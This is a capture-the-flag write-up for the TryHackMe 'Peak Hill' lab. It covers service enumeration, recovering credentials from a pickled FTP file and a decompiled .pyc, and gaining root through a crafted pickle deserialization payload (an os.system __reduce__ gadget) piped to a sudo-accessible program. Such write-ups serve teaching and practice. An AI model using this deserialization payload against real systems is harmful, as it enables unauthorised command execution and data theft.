# [Peak Hill](https://tryhackme.com/room/peakhill)

## Exercises in Python library abuse and some exploitation techniques

# Peak Hill

## Deploy and compromise the machine!

### What is the user flag?

1. Perform network service enumeration to identify available services and their versions

```bash
nmap -sV <TARGET_IP>
```

<img width="724" height="218" alt="SCREEN01" src="https://github.com/user-attachments/assets/df9a0d09-4194-4cc1-9bf8-c9b981152a1d" />

2. Connect to the identified FTP service using anonymous credentials to enumerate accessible files

```bash
ftp <TARGET_IP>
anonymous
get test.txt
get .creds
```

3. Process the `.creds` file content through CyberChef binary decoder. Input the binary content into [CyberChef](https://gchq.github.io/CyberChef/), apply "From Binary" operation, and download the resulting output as a `.dat` file

4. Execute the downloaded `.dat` file using Python's pickle module to extract embedded credentials. The deserialized data reveals user authentication information
   - The extracted credentials are: `gherkin:p1ckl3s_@11_@r0und_th3_w0rld`

```python
import pickle
with open("download.dat", "rb") as file:
    pickle_data = file.read()
    creds = pickle.loads(pickle_data)
    print(creds)
```

<img width="722" height="180" alt="SCREEN02" src="https://github.com/user-attachments/assets/447dbef8-15c7-4ca6-9533-8c08dc113b9e" />

5. Establish SSH connection using the obtained credentials to gain initial system access

```bash
ssh gherkin@<TARGET_IP>
```

6. Transfer and decompile the Python compiled bytecode file to examine the underlying source code structure

```bash
scp gherkin@10.10.157.4:cmd_service.pyc .
sudo pip3 install uncompyle6
uncompyle6 cmd_service.pyc
```

<img width="719" height="250" alt="SCREEN03" src="https://github.com/user-attachments/assets/019d1566-c019-4224-8dde-bc8b20cd4894" />

7. Analyze the decompiled code to identify encoded numerical values representing authentication credentials. Apply cryptographic conversion to decode the values
   - The decoded credentials are: `dill:n3v3r_@_d1ll_m0m3nt`

```python
from Crypto.Util.number import long_to_bytes

username_encoded = 1684630636
password_encoded = 2457564920124666544827225107428488864802762356

username = long_to_bytes(username_encoded).decode('utf-8')
password = long_to_bytes(password_encoded).decode('utf-8')

print(f"Username: {username}")
print(f"Password: {password}")
```

<img width="721" height="52" alt="SCREEN04" src="https://github.com/user-attachments/assets/4329b4d4-1fb1-4568-b752-b4c556770c61" />

8. Connect to the identified network service using the decoded credentials and locate the user flag

```bash
nc <TARGET_IP> 7321
cat /home/dill/user.txt
```

<img width="721" height="159" alt="SCREEN05" src="https://github.com/user-attachments/assets/5a07d29c-c11c-403a-bc6a-7d1d4a5b5cdd" />

---

### What is the root flag?

1. Examine available sudo permissions to identify potential privilege escalation vectors

```bash
sudo -l
```

2. Construct a pickle object containing arbitrary command execution functionality. The payload exploits Python's pickle deserialization to execute system commands with elevated privileges
   - Generated payload: `gASVJgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAtjYXQgL3Jvb3QvKpSFlFKULg==`

```python
#!/usr/bin/env python3
import pickle
import os
import base64

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('cat /root/*', ))
pickle_data = pickle.dumps(EvilPickle())

print(base64.b64encode(pickle_data))
```

3. Execute the malicious pickle payload through the identified sudo-accessible application to achieve root-level command execution and retrieve the root flag

```bash
echo "gASVJgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAtjYXQgL3Jvb3QvKpSFlFKULg==" | sudo /opt/peak_hill_farm/peak_hill_farm
```

<img width="721" height="129" alt="SCREEN07" src="https://github.com/user-attachments/assets/7f245c4f-1c85-4450-b8a6-50488b0bc0ba" />
